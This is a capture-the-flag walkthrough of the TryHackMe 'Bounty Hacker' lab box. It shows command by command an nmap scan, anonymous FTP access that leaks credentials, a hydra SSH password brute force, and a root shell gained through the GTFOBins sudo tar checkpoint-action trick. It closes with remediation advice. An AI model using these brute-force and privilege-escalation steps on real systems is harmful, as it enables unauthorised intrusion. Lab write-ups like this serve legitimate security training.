# Try Hack Me - Bounty Hacker

**Categories:** Linux, tar, privesc, security  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.158.229`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic port scan with nmap (`sudo nmap $IP`) and then a version enumeration scan on the 3 discovered ports (21, 22, and 80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/bounty-hacker]
└─$ sudo nmap -sV -O -p21,22,80 $IP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 22:34 EDT
Nmap scan report for 10.10.158.229
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
...snip...
```

A quick google / searchsploit search for these versions shows no relevant vulnerabilities, and gobuster finds nothing on 80 with dirbuster's `common.txt` and `directory-list-2.3-medium` wordlists. But anonymous login to the ftp server is successful and reveals 2 files : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/bounty-hacker]
└─$ ftp $IP
Connected to 10.10.158.229.
220 (vsFTPd 3.0.3)
Name (10.10.158.229:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
`task.txt` is a to-do list that discloses a possible username (lin) and `locks.txt` appears to be a password list : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/bounty-hacker]
└─$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
...snip...
```

## 2: Foothold - hydra

We use hydra to try the discovered password list with the "jin" username on ssh :

```console
┌──(kali㉿kali)-[~/Documents/tthm/bounty-hacker]
└─$ hydra -l lin -P locks.txt $IP ssh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-15 23:00:54
...snip...
[DATA] attacking ssh://10.10.158.229:22/
[22][ssh] host: 10.10.158.229   login: lin   password: PASSWORD
1 of 1 target successfully completed, 1 valid password found
...snip...
```

and then the discovered password to connect :

```console
┌──(kali㉿kali)-[~/Documents/tthm/bounty-hacker]
└─$ ssh lin@$IP
...snip...
lin@10.10.158.229's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
...snip...
```

The user flag is at `/home/lin/Desktop/user.txt`.

## 3. Privesc - tar, gtfobin

Running `sudo -l` as the lin user requires the same credentials used for the ssh connection, and shows that lin can run `/bin/tar` as root :

```console
lin@bountyhacker:~/Desktop$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

[GTFObins provides a (slightly unexpected) way to get a shell using tar](https://gtfobins.github.io/gtfobins/tar/) : 

```console
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

The flags perform the following actions :

* -cf DST SRC : create (-c) a new archive at DST of the file (-f) at SRC
* --checkpoint=INT : display a progress message for each INT records. records are an artefact from tar's days as a tape archive utility - setting checkpoint to 1 guarantees that a checkpoint will be reached, regardless of the size of the input file. In this case, the `--checkpoint` flag is used to provide access to the `--checkpoint-action` flag.
* --checkpoint-action=COMMAND : the action to be performed at each checkpoint. When coupled with `-exec`, `--checkpoint-action` allows tar to execute binaries, scripts, etc. on the host.

The commands executed by `--checkpoint-action` do not drop the elevated privileges granted by sudo, providing a root shell :

```console
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.

## 4. Summary and solutions

This is very much a beginner's box, but there are still a couple of lessons to be learned about how to avoid getting done :

* **FTP anonymous login, information disclosure** : Allowing anonymous login on FTP servers is a classic misconfiguration that can be mitigated in a few seconds - turn it off. In this example, the information disclosed by the misconfiguration is particularly egregious (usernames AND a password list...), but it's worth considering what determined attackers could do with the kind of files commonly hosted on a convenience FTP (a list of employee names and extensions, office schedules and holiday dates, etc.)
* **Principle of least privilege** : sudo access to a binary that can provide a shell is root access. When configuring your environment, you should know what your binaries do - [gtobins](https://gtfobins.github.io/) is a great place to start - and why your users need them. Why does the lin user need sudo access to an archiving utility? If they need to create archives that cannot be read or modified by other users, this can be managed at the group level - always ensure that privileges are scoped to the absolute minimum level required for users to perform their tasks.